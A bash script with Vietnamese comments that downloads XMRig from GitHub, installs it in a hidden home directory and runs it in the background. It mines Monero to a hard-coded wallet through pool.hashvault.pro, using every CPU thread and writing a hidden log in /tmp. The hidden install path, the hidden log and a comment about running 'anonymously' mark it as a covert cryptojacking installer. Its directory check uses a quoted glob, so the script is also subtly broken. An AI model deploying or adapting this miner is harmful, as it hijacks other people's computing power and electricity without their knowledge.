#!/bin/bash

# ========= Cấu hình =========
POOL="pool.hashvault.pro:443"
WALLET="85JiygdevZmb1AxUosPHyxC13iVu9zCydQ2mDFEBJaHp2wyupPnq57n6bRcNBwYSh9bA5SA4MhTDh9moj55FwinXGn9jDkz"
WORKER="tesst-$(hostname)"
CPU_THREADS=$(nproc --all)  # Tự động chọn số luồng CPU
LOG_FILE="/tmp/.xmrig_hidden.log"
INSTALL_DIR="$HOME/.xmrig"  # Thư mục ẩn

# ========= Bắt đầu =========
echo "🚀 Bắt đầu tải và cài đặt XMRig..."

# Tải lại tệp XMRig
wget -q --show-progress https://github.com/xmrig/xmrig/releases/latest/download/xmrig-6.21.1-linux-x64.tar.gz -O xmrig.tar.gz

# Kiểm tra xem tệp đã tải về thành công không
if [ ! -f "xmrig.tar.gz" ]; then
  echo "❌ Lỗi tải tệp XMRig. Thử lại."
  exit 1
fi

# Giải nén tệp XMRig
tar -xvzf xmrig.tar.gz

# Kiểm tra xem tệp đã giải nén thành công chưa
if [ ! -d "xmrig-*-linux-x64" ]; then
  echo "❌ Lỗi giải nén tệp. Thử lại."
  exit 1
fi

# Di chuyển vào thư mục XMRig và sao chép tệp vào thư mục ẩn
cd xmrig-*-linux-x64
mkdir -p "$INSTALL_DIR"
cp ./xmrig "$INSTALL_DIR/xmrig"

# Thiết lập quyền truy cập
chmod +x "$INSTALL_DIR/xmrig"

# Chạy XMRig ẩn danh và lưu log
echo "🛠️ Đang khởi động quá trình đào Monero..."
nohup "$INSTALL_DIR/xmrig" -o $POOL -u $WALLET.$WORKER -k --coin monero --tls --cpu-priority=3 --threads=$CPU_THREADS --max-cpu-usage=70 > "$LOG_FILE" 2>&1 &

# Thông báo đã khởi động thành công
echo "✅ Đang đào Monero, tiến trình đang chạy ngầm."
echo "📂 Log: $LOG_FILE"

# Kiểm tra log để đảm bảo tiến trình đào đang chạy
tail -f "$LOG_FILE"
